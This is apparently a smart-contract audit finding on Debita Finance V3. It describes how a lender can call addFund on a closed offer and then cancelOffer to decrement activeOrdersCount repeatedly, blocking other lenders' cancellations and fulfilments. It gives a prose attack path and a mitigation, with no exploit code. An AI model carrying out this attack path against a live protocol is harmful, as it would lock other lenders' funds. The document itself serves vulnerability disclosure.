# A malicious lender can obstruct legitimate lenders from canceling or fully fulfilling their offers if the offer is not perpetual.

### Summary

A malicious Lender can exploit the cancellation process of a lender's offer by invoking the `addFund` function followed by the `cancelOffer` function. This allows them to decrease the `activeOrdersCount` multiple times for the same order, resulting in a DoS for the current offer. As a consequence, the lenders of other offers are unable to cancel and the complete  fulfill of the offer can not be executed, preventing its deletion from the `DebitaLendOfferFactory` contract.


### Root Cause

 [Here](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L162-L175). The owner can calls `addFund` to not `activeOrders`.


### Internal pre-conditions

The order is already deleted from `DebitaLendOfferFactory` either after completion or the owner decided to `cancelOffer`.


### External pre-conditions

_No response_

### Attack Path

1. The Lender will calls `addFund` to closed order.
2. The Lender calls the `cancelOffer`.
3. This Attack will decrements the `activeOrdersCount` twice for same order and the attacker can repeat this attack to DoS all Current Offers or `activeOrdersCount` becomes 0.


### Impact

The existing orders cannot be canceled and cannot be fully fulfilled. In case if current Lenders want to withdraw assets it will result in lose of assets for Lender.

### Mitigation

Don't allow the Lender to addFund when order is not active.
